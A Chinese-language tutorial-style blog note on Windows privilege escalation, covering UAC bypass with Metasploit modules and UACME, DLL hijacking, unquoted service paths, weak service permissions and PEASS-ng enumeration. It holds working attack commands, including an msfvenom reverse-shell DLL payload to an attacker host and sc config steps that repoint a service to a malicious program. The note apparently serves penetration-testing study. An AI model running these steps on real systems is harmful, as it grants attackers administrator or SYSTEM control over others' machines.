---
title: "Win系统提权：UAC绕过、DLL劫持、未引号路径、可控服务"
pubDate: 2026-08-18
tags:
  - 安全
  - 提权
---

配置/机制类提权：UAC 绕过、DLL 劫持、未引号服务路径、服务权限配置错误，最后 PEASS-ng 全检收尾

## UAC 绕过

UAC 是 Win7+ 的机制：普通用户执行高权限操作时弹确认框。MSF 上线后 `getsystem` 提权失败，可能就是 UAC 挡的（关闭 UAC 就能成）。绕过两种：

**MSF 模块**

```shell
use exploit/windows/local/ask                 
use exploit/windows/local/bypassuac            
use exploit/windows/local/bypassuac_sluihijack 
use exploit/windows/local/bypassuac_silentcleanup  
```

**UACME**（https://github.com/hfiref0x/UACME ）：VS 编译 uacme.sln 成 exe

```shell
Akagi64.exe 编号(1-81) 要执行的程序(cmd.exe)
```

按说明文档选编号试，无弹窗弹出管理员 cmd 即绕过成功；用它跑 MSF 木马再 getsystem

## DLL 劫持

程序启动要加载 DLL，按顺序找：应用目录 → System32 → System → Windows → 当前目录 → PATH。如果某个 DLL 不存在或可被替换，放恶意 DLL 在搜索路径前面就劫持

流程：信息收集（翻目录找有自带 DLL 的应用）→ 调试看运行时加载哪些 DLL→ msfvenom 生成恶意 dll 替换→ 等管理员启动程序上线：

```shell
msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=端口 -f dll -o libeay32.dll
```

## 未引号服务路径

服务路径有空格且没引号时：`C:\program files(x86)\grassoft\xxx` 会被解析成先执行 `C:\program.exe`（空格截断），后面当参数。检测：

```shell
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

在 C 盘放 program.exe 恶意程序，服务重启即执行上线

## 不安全服务权限

服务路径正确引用了，但用户对服务权限过大（管理配置错误），能直接改服务指向

```shell
accesschk.exe -uwcqv "用户名" *
```

发现某用户对某服务有完全控制权限，就改 binpath 指向恶意文件：

```shell
sc config "xiaodi" binpath= "C:\Program.exe"
sc start xiaodi
```

实战用得少——Web 权限往往连服务权限/执行权限都没有

## 全检项目 PEASS-ng

https://github.com/carlospolop/PEASS-ng ，Win/Linux/Mac 通吃、更新勤。上传运行：

```shell
winPEASbat.bat > result.txt
winPEASany.exe log=result.txt
```

结果丢 AI 分析

## 要点

getsystem 被 UAC 挡 → MSF bypassuac 模块或 UACME；目标机有带 DLL 的小软件 → DLL 劫持替换等管理员触发；服务路径空格无引号 → wmic 检测后放截断名木马；服务权限配置错 → accesschk 找可控服务改 binpath。全检直接 winPEAS 出报告喂 AI。实战优先级：土豆 > UACME > 这些配置类；配置类提权更多出现在 CTF/靶场
